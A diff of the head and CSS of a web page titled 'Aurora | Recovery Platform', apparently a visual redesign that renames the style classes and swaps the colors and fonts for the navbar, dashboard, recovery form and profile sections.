@@ -3,11 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Aurora | Plataforma de Recuperação</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>Aurora | Recovery Platform</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        /* ===== NOVO DESIGN COMPLETO ===== */
+        /* ============================================================
+           NOVO DESIGN COMPLETO - AURORA v8
+           ============================================================ */
+        
+        /* ----- RESET ----- */
         * {
             margin: 0;
             padding: 0;
@@ -15,137 +19,106 @@
         }
 
         :root {
-            --primary: #6c2bd9;
-            --primary-light: #8b5cf6;
-            --secondary: #a855f7;
-            --accent: #d946ef;
-            --dark: #0a0a0f;
-            --darker: #050508;
-            --glass: rgba(255, 255, 255, 0.03);
-            --glass-border: rgba(255, 255, 255, 0.06);
-            --text-primary: #ffffff;
-            --text-secondary: rgba(255, 255, 255, 0.6);
-            --text-muted: rgba(255, 255, 255, 0.3);
-            --gradient-main: linear-gradient(135deg, #6c2bd9, #a855f7, #d946ef);
-            --gradient-glow: radial-gradient(ellipse at center, rgba(108, 43, 217, 0.3), transparent 70%);
+            --bg-primary: #07060e;
+            --bg-secondary: #0d0b1a;
+            --bg-card: #12102a;
+            --border-color: rgba(255, 255, 255, 0.04);
+            --text-primary: #f0edff;
+            --text-secondary: #9892b8;
+            --text-muted: #5a5478;
+            --accent-1: #6c3bf7;
+            --accent-2: #9d6aff;
+            --accent-3: #c084fc;
+            --gradient: linear-gradient(135deg, #6c3bf7, #9d6aff, #c084fc);
+            --shadow: 0 20px 60px rgba(108, 59, 247, 0.08);
+            --radius: 16px;
         }
 
-        html {
-            scroll-behavior: smooth;
-        }
-
+        html { scroll-behavior: smooth; }
+        
         body {
             font-family: 'Inter', sans-serif;
-            background: var(--darker);
+            background: var(--bg-primary);
             color: var(--text-primary);
             line-height: 1.6;
             overflow-x: hidden;
             min-height: 100vh;
         }
 
-        /* ===== FUNDO NEON ===== */
-        .hero-bg {
+        /* ----- SCROLLBAR ----- */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--accent-1); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent-2); }
+
+        /* ----- BACKGROUND ANIMADO ----- */
+        .bg-canvas {
             position: fixed;
             inset: 0;
             z-index: 0;
             overflow: hidden;
+            pointer-events: none;
         }
 
-        .hero-bg .grid-lines {
-            position: absolute;
-            inset: 0;
-            background-image: 
-                linear-gradient(rgba(108, 43, 217, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(108, 43, 217, 0.03) 1px, transparent 1px);
-            background-size: 60px 60px;
-        }
-
-        .hero-bg .neon-glow {
+        .bg-canvas .orb {
             position: absolute;
             border-radius: 50%;
             filter: blur(120px);
-            opacity: 0.3;
-            animation: floatGlow 8s ease-in-out infinite alternate;
+            opacity: 0.12;
+            animation: orbFloat 20s ease-in-out infinite alternate;
         }
 
-        .hero-bg .neon-glow.g1 {
-            width: 600px;
-            height: 600px;
-            background: #6c2bd9;
+        .bg-canvas .orb.o1 {
+            width: 500px;
+            height: 500px;
+            background: var(--accent-1);
             top: -20%;
             left: -10%;
             animation-delay: 0s;
         }
 
-        .hero-bg .neon-glow.g2 {
+        .bg-canvas .orb.o2 {
             width: 400px;
             height: 400px;
-            background: #d946ef;
+            background: var(--accent-2);
             bottom: -20%;
             right: -10%;
-            animation-delay: -3s;
+            animation-delay: -7s;
         }
 
-        .hero-bg .neon-glow.g3 {
+        .bg-canvas .orb.o3 {
             width: 300px;
             height: 300px;
-            background: #a855f7;
+            background: var(--accent-3);
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            animation-delay: -6s;
-            opacity: 0.15;
+            animation-delay: -14s;
+            opacity: 0.06;
         }
 
-        @keyframes floatGlow {
+        @keyframes orbFloat {
             0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(40px, -40px) scale(1.3); }
+            100% { transform: translate(60px, -60px) scale(1.3); }
         }
 
-        .particles {
+        .bg-canvas .grid {
             position: absolute;
             inset: 0;
-            overflow: hidden;
+            background-image: 
+                linear-gradient(rgba(108, 59, 247, 0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(108, 59, 247, 0.02) 1px, transparent 1px);
+            background-size: 80px 80px;
         }
 
-        .particle {
-            position: absolute;
-            width: 3px;
-            height: 3px;
-            background: var(--secondary);
-            border-radius: 50%;
-            animation: floatParticle 15s linear infinite;
-            opacity: 0.3;
-        }
-
-        .particle:nth-child(1) { left: 10%; animation-delay: 0s; }
-        .particle:nth-child(2) { left: 20%; animation-delay: 2s; width: 2px; height: 2px; }
-        .particle:nth-child(3) { left: 30%; animation-delay: 4s; }
-        .particle:nth-child(4) { left: 40%; animation-delay: 1s; width: 4px; height: 4px; }
-        .particle:nth-child(5) { left: 50%; animation-delay: 3s; }
-        .particle:nth-child(6) { left: 60%; animation-delay: 5s; width: 2px; height: 2px; }
-        .particle:nth-child(7) { left: 70%; animation-delay: 2s; }
-        .particle:nth-child(8) { left: 80%; animation-delay: 4s; width: 4px; height: 4px; }
-        .particle:nth-child(9) { left: 90%; animation-delay: 1s; }
-        .particle:nth-child(10) { left: 15%; animation-delay: 6s; width: 2px; height: 2px; }
-        .particle:nth-child(11) { left: 45%; animation-delay: 3s; }
-        .particle:nth-child(12) { left: 75%; animation-delay: 5s; width: 3px; height: 3px; }
-
-        @keyframes floatParticle {
-            0% { transform: translateY(100vh) scale(0); opacity: 0; }
-            10% { opacity: 0.5; }
-            90% { opacity: 0.5; }
-            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
-        }
-
-        /* ===== ANIMAÇÕES ===== */
-        @keyframes fadeInUp {
+        /* ----- ANIMAÇÕES ----- */
+        @keyframes fadeUp {
             from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        @keyframes scaleIn {
-            from { opacity: 0; transform: scale(0.9); }
+        @keyframes fadeScale {
+            from { opacity: 0; transform: scale(0.95); }
             to { opacity: 1; transform: scale(1); }
         }
 
@@ -159,38 +132,44 @@
             to { transform: rotate(360deg); }
         }
 
-        @keyframes shimmer {
-            0% { background-position: -200% center; }
-            100% { background-position: 200% center; }
+        @keyframes slideRight {
+            from { opacity: 0; transform: translateX(40px); }
+            to { opacity: 1; transform: translateX(0); }
         }
 
-        /* ===== SCROLLBAR ===== */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: var(--darker); }
-        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--secondary); }
+        /* ----- SCROLL ANIMATION ----- */
+        .reveal {
+            opacity: 0;
+            transform: translateY(40px);
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
 
-        /* ===== NAVBAR ===== */
+        .reveal.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* ----- NAVBAR ----- */
         .navbar {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             z-index: 1000;
-            padding: 0.8rem 0;
-            background: rgba(5, 5, 8, 0.85);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 0.7rem 0;
+            background: rgba(7, 6, 14, 0.75);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-bottom: 1px solid var(--border-color);
             transition: all 0.3s ease;
         }
 
         .navbar.scrolled {
-            background: rgba(5, 5, 8, 0.95);
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            background: rgba(7, 6, 14, 0.92);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
         }
 
-        .nav-container {
+        .nav-inner {
             max-width: 1200px;
             margin: 0 auto;
             padding: 0 1.5rem;
@@ -199,41 +178,42 @@
             align-items: center;
         }
 
-        .nav-logo {
+        .nav-brand {
             display: flex;
             align-items: center;
-            gap: 0.5rem;
-            font-family: 'Orbitron', monospace;
-            font-size: 1.1rem;
-            font-weight: 700;
+            gap: 0.6rem;
             cursor: pointer;
             text-decoration: none;
-            color: var(--text-primary);
         }
 
-        .nav-logo .logo-icon {
-            width: 32px;
-            height: 32px;
-            background: var(--gradient-main);
-            border-radius: 8px;
+        .nav-brand .brand-icon {
+            width: 34px;
+            height: 34px;
+            background: var(--gradient);
+            border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 0.9rem;
+            font-weight: 700;
             color: white;
-            box-shadow: 0 0 30px rgba(108, 43, 217, 0.3);
+            font-family: 'Space Grotesk', sans-serif;
         }
 
-        .nav-logo span {
-            background: var(--gradient-main);
+        .nav-brand .brand-text {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            letter-spacing: -0.5px;
         }
 
         .nav-links {
             display: flex;
-            gap: 0.3rem;
+            gap: 0.2rem;
             align-items: center;
         }
 
@@ -241,7 +221,7 @@
             color: var(--text-secondary);
             text-decoration: none;
             font-size: 0.8rem;
-            font-weight: 600;
+            font-weight: 500;
             padding: 0.4rem 0.8rem;
             border-radius: 8px;
             transition: all 0.3s ease;
@@ -253,44 +233,43 @@
 
         .nav-link:hover {
             color: var(--text-primary);
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.04);
         }
 
         .nav-link.active {
             color: var(--text-primary);
-            background: rgba(108, 43, 217, 0.15);
+            background: rgba(108, 59, 247, 0.12);
         }
 
-        .nav-user {
+        .nav-auth {
             display: flex;
             align-items: center;
-            gap: 0.5rem;
-            position: relative;
+            gap: 0.6rem;
         }
 
         .nav-avatar {
             width: 34px;
             height: 34px;
             border-radius: 50%;
-            background: var(--gradient-main);
+            background: var(--gradient);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: 700;
+            font-weight: 600;
             font-size: 0.8rem;
             color: white;
             cursor: pointer;
-            border: 2px solid rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.06);
             transition: all 0.3s ease;
             position: relative;
         }
 
         .nav-avatar:hover {
-            border-color: var(--secondary);
-            box-shadow: 0 0 20px rgba(108, 43, 217, 0.3);
+            border-color: var(--accent-2);
+            box-shadow: 0 0 30px rgba(108, 59, 247, 0.2);
         }
 
-        .nav-avatar .online-dot {
+        .nav-avatar .dot {
             position: absolute;
             bottom: -2px;
             right: -2px;
@@ -298,26 +277,42 @@
             height: 10px;
             border-radius: 50%;
             background: #22c55e;
-            border: 2px solid var(--darker);
+            border: 2px solid var(--bg-primary);
         }
 
-        .nav-auth-btn {
-            padding: 0.35rem 1rem;
+        .nav-username {
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: color 0.3s ease;
+            max-width: 80px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .nav-username:hover {
+            color: var(--text-primary);
+        }
+
+        .btn-login {
+            padding: 0.35rem 1.2rem;
             border: none;
             border-radius: 8px;
-            font-weight: 700;
+            font-weight: 600;
             font-size: 0.75rem;
             cursor: pointer;
             transition: all 0.3s ease;
             font-family: 'Inter', sans-serif;
-            background: var(--gradient-main);
+            background: var(--gradient);
             color: white;
-            box-shadow: 0 10px 30px rgba(108, 43, 217, 0.3);
+            box-shadow: 0 10px 30px rgba(108, 59, 247, 0.2);
         }
 
-        .nav-auth-btn:hover {
+        .btn-login:hover {
             transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(108, 43, 217, 0.5);
+            box-shadow: 0 15px 40px rgba(108, 59, 247, 0.35);
         }
 
         .nav-toggle {
@@ -330,24 +325,30 @@
             padding: 0.3rem;
         }
 
+        /* ----- DROPDOWN ----- */
+        .dropdown-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
         .dropdown-menu {
             position: absolute;
-            top: calc(100% + 10px);
+            top: calc(100% + 8px);
             right: 0;
-            background: rgba(5, 5, 8, 0.98);
+            background: rgba(7, 6, 14, 0.98);
             backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            border: 1px solid var(--border-color);
             border-radius: 12px;
             padding: 0.3rem 0;
             min-width: 180px;
             display: none;
-            animation: fadeInUp 0.3s ease-out;
+            animation: fadeUp 0.3s ease-out;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
         }
 
-        .dropdown-menu.open {
-            display: block;
-        }
+        .dropdown-menu.open { display: block; }
 
         .dropdown-item {
             display: flex;
@@ -356,7 +357,7 @@
             padding: 0.5rem 1.2rem;
             color: var(--text-secondary);
             font-size: 0.8rem;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
             transition: all 0.3s ease;
             border: none;
@@ -367,18 +368,19 @@
         }
 
         .dropdown-item:hover {
-            background: rgba(108, 43, 217, 0.1);
+            background: rgba(108, 59, 247, 0.08);
             color: var(--text-primary);
         }
 
         .dropdown-item i {
             width: 18px;
-            color: var(--secondary);
+            color: var(--accent-2);
+            font-size: 0.8rem;
         }
 
         .dropdown-divider {
             height: 1px;
-            background: rgba(255, 255, 255, 0.05);
+            background: var(--border-color);
             margin: 0.2rem 1rem;
         }
 
@@ -387,7 +389,7 @@
         }
 
         .dropdown-item.logout:hover {
-            background: rgba(239, 68, 68, 0.1);
+            background: rgba(239, 68, 68, 0.08);
             color: #ef4444;
         }
 
@@ -404,7 +406,7 @@
             z-index: 1;
         }
 
-        /* ===== SEÇÕES ===== */
+        /* ===== SECTIONS ===== */
         .section {
             display: none;
             min-height: 100vh;
@@ -415,7 +417,7 @@
 
         .section.active {
             display: block;
-            animation: fadeInUp 0.5s ease-out;
+            animation: fadeUp 0.5s ease-out;
         }
 
         /* ===== HOME ===== */
@@ -424,77 +426,76 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            text-align: center;
             padding: 2rem 0;
         }
 
-        .hero-content {
+        .hero-inner {
             max-width: 800px;
-            animation: fadeInUp 0.8s ease-out;
+            text-align: center;
+            animation: fadeUp 0.8s ease-out;
         }
 
         .hero-badge {
             display: inline-flex;
             align-items: center;
             gap: 0.5rem;
-            background: rgba(108, 43, 217, 0.15);
-            border: 1px solid rgba(108, 43, 217, 0.3);
-            color: var(--secondary);
+            background: rgba(108, 59, 247, 0.1);
+            border: 1px solid rgba(108, 59, 247, 0.15);
+            color: var(--accent-3);
             padding: 0.3rem 1.2rem;
-            border-radius: 50px;
+            border-radius: 100px;
             font-size: 0.7rem;
-            font-weight: 700;
-            letter-spacing: 1px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
             text-transform: uppercase;
             margin-bottom: 1.5rem;
-            backdrop-filter: blur(10px);
         }
 
         .hero-title {
-            font-family: 'Orbitron', monospace;
-            font-size: clamp(3rem, 8vw, 6rem);
-            font-weight: 900;
-            line-height: 1;
-            margin-bottom: 1rem;
-            background: var(--gradient-main);
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: clamp(3rem, 9vw, 5.5rem);
+            font-weight: 700;
+            line-height: 1.05;
+            margin-bottom: 0.5rem;
+            letter-spacing: -2px;
+            background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            text-shadow: 0 0 60px rgba(108, 43, 217, 0.15);
         }
 
-        .hero-subtitle {
-            font-size: clamp(1rem, 1.8vw, 1.3rem);
+        .hero-sub {
+            font-size: clamp(1rem, 1.6vw, 1.2rem);
             color: var(--text-secondary);
-            margin-bottom: 0.5rem;
+            margin-bottom: 0.3rem;
         }
 
-        .hero-subtitle .highlight {
-            color: var(--secondary);
-            font-weight: 700;
+        .hero-sub .hl {
+            color: var(--accent-3);
+            font-weight: 600;
         }
 
         .hero-desc {
-            font-size: clamp(0.9rem, 1.2vw, 1rem);
+            font-size: clamp(0.9rem, 1.1vw, 1rem);
             color: var(--text-muted);
-            max-width: 600px;
+            max-width: 550px;
             margin: 1rem auto 2.5rem;
             line-height: 1.8;
         }
 
-        .hero-buttons {
+        .hero-actions {
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
             gap: 0.8rem;
         }
 
-        /* ===== BOTÕES ===== */
+        /* ----- BOTÕES ----- */
         .btn {
             padding: 0.7rem 1.8rem;
             border: none;
             border-radius: 10px;
-            font-weight: 700;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
             display: inline-flex;
@@ -507,24 +508,25 @@
         }
 
         .btn-primary {
-            background: var(--gradient-main);
+            background: var(--gradient);
             color: white;
-            box-shadow: 0 10px 30px rgba(108, 43, 217, 0.3);
+            box-shadow: 0 10px 30px rgba(108, 59, 247, 0.2);
         }
 
         .btn-primary:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(108, 43, 217, 0.5);
+            box-shadow: 0 15px 40px rgba(108, 59, 247, 0.35);
         }
 
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.05);
+        .btn-outline {
+            background: transparent;
+            color: var(--text-secondary);
+            border: 1.5px solid var(--border-color);
+        }
+
+        .btn-outline:hover {
+            background: rgba(255, 255, 255, 0.04);
             color: var(--text-primary);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.1);
             transform: translateY(-3px);
         }
 
@@ -538,45 +540,32 @@
             justify-content: center;
         }
 
-        .btn-glow {
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-glow::before {
-            content: '';
-            position: absolute;
-            inset: -2px;
-            background: var(--gradient-main);
-            border-radius: 12px;
-            z-index: -1;
-            filter: blur(20px);
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .btn-glow:hover::before {
-            opacity: 1;
+        .btn-sm {
+            padding: 0.5rem 1.2rem;
+            font-size: 0.75rem;
         }
 
         /* ===== FEATURES ===== */
-        .section-title {
-            font-family: 'Orbitron', monospace;
-            font-size: clamp(1.8rem, 4vw, 2.8rem);
-            font-weight: 700;
+        .section-header {
             text-align: center;
-            margin-bottom: 0.5rem;
-            background: var(--gradient-main);
+            margin-bottom: 3rem;
+        }
+
+        .section-header h2 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: clamp(1.8rem, 3.5vw, 2.6rem);
+            font-weight: 700;
+            letter-spacing: -1px;
+            background: var(--gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
 
-        .section-sub {
-            text-align: center;
+        .section-header p {
             color: var(--text-secondary);
-            font-size: clamp(0.9rem, 1.2vw, 1rem);
-            margin-bottom: 3rem;
+            font-size: clamp(0.9rem, 1.1vw, 1rem);
+            margin-top: 0.3rem;
         }
 
         .features-grid {
@@ -586,14 +575,12 @@
         }
 
         .feature-card {
-            background: var(--glass);
-            border: 1px solid var(--glass-border);
-            border-radius: 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 2rem;
             text-align: center;
             transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-            animation: fadeInUp 0.6s ease-out forwards;
-            opacity: 0;
             position: relative;
             overflow: hidden;
         }
@@ -602,52 +589,46 @@
             content: '';
             position: absolute;
             inset: 0;
-            background: var(--gradient-glow);
+            background: var(--gradient);
             opacity: 0;
             transition: opacity 0.4s ease;
+            border-radius: var(--radius);
         }
 
         .feature-card:hover::before {
-            opacity: 1;
+            opacity: 0.03;
         }
 
         .feature-card:hover {
-            transform: translateY(-8px);
-            border-color: rgba(108, 43, 217, 0.3);
-            box-shadow: 0 20px 60px rgba(108, 43, 217, 0.1);
+            transform: translateY(-6px);
+            border-color: rgba(108, 59, 247, 0.2);
         }
 
-        .feature-card:nth-child(1) { animation-delay: 0.1s; }
-        .feature-card:nth-child(2) { animation-delay: 0.15s; }
-        .feature-card:nth-child(3) { animation-delay: 0.2s; }
-        .feature-card:nth-child(4) { animation-delay: 0.25s; }
-
-        .feature-icon {
-            width: 56px;
-            height: 56px;
-            background: var(--gradient-main);
+        .feature-card .icon {
+            width: 52px;
+            height: 52px;
+            background: rgba(108, 59, 247, 0.1);
             border-radius: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 1.3rem;
-            color: white;
+            color: var(--accent-3);
             margin: 0 auto 0.8rem;
-            box-shadow: 0 10px 30px rgba(108, 43, 217, 0.2);
             transition: all 0.3s ease;
             position: relative;
             z-index: 1;
         }
 
-        .feature-card:hover .feature-icon {
-            transform: scale(1.1) rotate(10deg);
+        .feature-card:hover .icon {
+            background: rgba(108, 59, 247, 0.2);
+            transform: scale(1.05);
         }
 
         .feature-card h3 {
             font-size: 1rem;
-            font-weight: 800;
+            font-weight: 700;
             color: var(--text-primary);
-            margin-bottom: 0.3rem;
             position: relative;
             z-index: 1;
         }
@@ -658,63 +639,43 @@
             line-height: 1.6;
             position: relative;
             z-index: 1;
+            margin-top: 0.2rem;
         }
 
         /* ===== DASHBOARD ===== */
-        .dash-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin-bottom: 2rem;
-        }
-
-        .dash-header h2 {
-            font-family: 'Orbitron', monospace;
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: var(--text-primary);
-        }
-
-        .dash-header p {
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-        }
-
         .dash-stats {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
             gap: 1rem;
             margin-bottom: 2rem;
         }
 
-        .stat-item {
-            background: var(--glass);
-            border: 1px solid var(--glass-border);
-            border-radius: 12px;
+        .stat-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 1.2rem;
             text-align: center;
             transition: all 0.3s ease;
         }
 
-        .stat-item:hover {
-            border-color: rgba(108, 43, 217, 0.3);
+        .stat-card:hover {
+            border-color: rgba(108, 59, 247, 0.2);
             transform: translateY(-4px);
         }
 
-        .stat-item .stat-number {
-            font-family: 'Orbitron', monospace;
+        .stat-card .num {
+            font-family: 'Space Grotesk', sans-serif;
             font-size: 1.8rem;
             font-weight: 700;
             color: var(--text-primary);
             display: block;
         }
 
-        .stat-item .stat-label {
+        .stat-card .label {
             font-size: 0.7rem;
             color: var(--text-muted);
-            font-weight: 600;
+            font-weight: 500;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
@@ -726,15 +687,15 @@
         }
 
         .dash-card {
-            background: var(--glass);
-            border: 1px solid var(--glass-border);
-            border-radius: 14px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 1.5rem;
             transition: all 0.3s ease;
         }
 
         .dash-card:hover {
-            border-color: rgba(108, 43, 217, 0.2);
+            border-color: rgba(108, 59, 247, 0.15);
         }
 
         .dash-card h3 {
@@ -748,15 +709,15 @@
         }
 
         .dash-card h3 i {
-            color: var(--secondary);
+            color: var(--accent-3);
         }
 
         .activity-item {
             display: flex;
             align-items: center;
             gap: 0.6rem;
-            padding: 0.5rem 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            padding: 0.4rem 0;
+            border-bottom: 1px solid var(--border-color);
         }
 
         .activity-item:last-child {
@@ -771,9 +732,9 @@
         }
 
         .activity-dot.green { background: #22c55e; }
-        .activity-dot.purple { background: #a855f7; }
+        .activity-dot.purple { background: var(--accent-2); }
         .activity-dot.blue { background: #3b82f6; }
-        .activity-dot.yellow { background: #f59e0b; }
+        .activity-dot.orange { background: #f59e0b; }
 
         .activity-text {
             font-size: 0.8rem;
@@ -793,27 +754,27 @@
         }
 
         .quick-actions .btn {
-            font-size: 0.8rem;
-            padding: 0.6rem;
             width: 100%;
             justify-content: center;
+            font-size: 0.8rem;
+            padding: 0.6rem;
         }
 
         /* ===== RECOVERY ===== */
-        .recovery-wrapper {
-            max-width: 800px;
+        .recovery-wrap {
+            max-width: 760px;
             margin: 0 auto;
         }
 
         .recovery-box {
-            background: var(--glass);
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 2.5rem;
-            animation: fadeInUp 0.6s ease-out;
+            animation: fadeUp 0.6s ease-out;
         }
 
-        .recovery-box .box-header {
+        .recovery-box .head {
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -821,14 +782,25 @@
             gap: 0.8rem;
             margin-bottom: 2rem;
             padding-bottom: 1.5rem;
-            border-bottom: 1px solid var(--glass-border);
+            border-bottom: 1px solid var(--border-color);
         }
 
-        .recovery-box .box-header h1 {
-            font-family: 'Orbitron', monospace;
-            font-size: clamp(1.2rem, 2vw, 1.6rem);
+        .recovery-box .head h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: clamp(1.2rem, 1.8vw, 1.5rem);
             font-weight: 700;
             color: var(--text-primary);
+        }
+
+        .recovery-box .head .tag {
+            background: var(--gradient);
+            color: white;
+            padding: 0.2rem 1rem;
+            border-radius: 100px;
+            font-size: 0.6rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         .form-group {
@@ -844,7 +816,7 @@
         }
 
         .form-group label i {
-            color: var(--secondary);
+            color: var(--accent-3);
             margin-right: 0.3rem;
         }
 
@@ -854,30 +826,30 @@
             align-items: center;
         }
 
-        .form-input {
+        .input-field {
             width: 100%;
             padding: 0.8rem 1rem;
             background: rgba(255, 255, 255, 0.03);
-            border: 1.5px solid rgba(255, 255, 255, 0.06);
-            border-radius: 12px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 10px;
             color: var(--text-primary);
             font-size: 0.85rem;
             transition: all 0.3s ease;
             font-family: 'Inter', sans-serif;
         }
 
-        .form-input:focus {
+        .input-field:focus {
             outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 4px rgba(108, 43, 217, 0.1);
+            border-color: var(--accent-1);
+            box-shadow: 0 0 0 4px rgba(108, 59, 247, 0.06);
             background: rgba(255, 255, 255, 0.05);
         }
 
-        .form-input::placeholder {
+        .input-field::placeholder {
             color: var(--text-muted);
         }
 
-        .toggle-eye {
+        .input-toggle {
             position: absolute;
             right: 1rem;
             background: none;
@@ -889,11 +861,11 @@
             padding: 0.3rem;
         }
 
-        .toggle-eye:hover {
-            color: var(--secondary);
+        .input-toggle:hover {
+            color: var(--accent-3);
         }
 
-        .form-hint {
+        .input-hint {
             font-size: 0.7rem;
             color: var(--text-muted);
             margin-top: 0.3rem;
@@ -901,9 +873,9 @@
         }
 
         .security-badge {
-            background: rgba(108, 43, 217, 0.08);
-            border: 1px solid rgba(108, 43, 217, 0.15);
-            border-radius: 12px;
+            background: rgba(108, 59, 247, 0.05);
+            border: 1px solid rgba(108, 59, 247, 0.08);
+            border-radius: 10px;
             padding: 0.8rem 1rem;
             display: flex;
             gap: 0.8rem;
@@ -911,8 +883,8 @@
         }
 
         .security-badge i {
-            color: var(--secondary);
-            font-size: 1.1rem;
+            color: var(--accent-3);
+            font-size: 1rem;
             flex-shrink: 0;
             margin-top: 0.1rem;
         }
@@ -921,6 +893,7 @@
             color: var(--text-secondary);
             font-size: 0.8rem;
             line-height: 1.6;
+            margin: 0;
         }
 
         .security-badge strong {
@@ -928,8 +901,8 @@
         }
 
         .block-msg {
-            background: rgba(239, 68, 68, 0.08);
-            border: 2px solid rgba(239, 68, 68, 0.15);
+            background: rgba(239, 68, 68, 0.05);
+            border: 2px solid rgba(239, 68, 68, 0.1);
             border-radius: 12px;
             padding: 1.5rem;
             text-align: center;
@@ -939,7 +912,7 @@
 
         .block-msg.visible {
             display: block;
-            animation: fadeInUp 0.4s ease-out;
+            animation: fadeUp 0.4s ease-out;
         }
 
         .block-msg i {
@@ -951,7 +924,7 @@
 
         .block-msg h3 {
             color: #ef4444;
-            font-weight: 800;
+            font-weight: 700;
             font-size: 1rem;
             margin-bottom: 0.3rem;
         }
@@ -963,12 +936,13 @@
 
         .block-msg .timer {
             font-size: 1.6rem;
-            font-weight: 900;
-            color: var(--secondary);
+            font-weight: 700;
+            color: var(--accent-3);
             margin: 0.3rem 0;
+            font-family: 'Space Grotesk', sans-serif;
         }
 
-        .terms-text {
+        .terms-note {
             text-align: center;
             color: var(--text-muted);
             font-size: 0.65rem;
@@ -976,58 +950,59 @@
             margin-top: 1rem;
         }
 
-        .terms-text a {
-            color: var(--secondary);
+        .terms-note a {
+            color: var(--accent-3);
             text-decoration: none;
-            font-weight: 700;
+            font-weight: 600;
         }
 
-        .terms-text a:hover {
-            color: var(--primary-light);
+        .terms-note a:hover {
+            color: var(--accent-2);
         }
 
         /* ===== PROFILE ===== */
-        .profile-wrapper {
-            max-width: 500px;
+        .profile-wrap {
+            max-width: 480px;
             margin: 0 auto;
         }
 
         .profile-box {
-            background: var(--glass);
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
             padding: 2.5rem;
             text-align: center;
         }
 
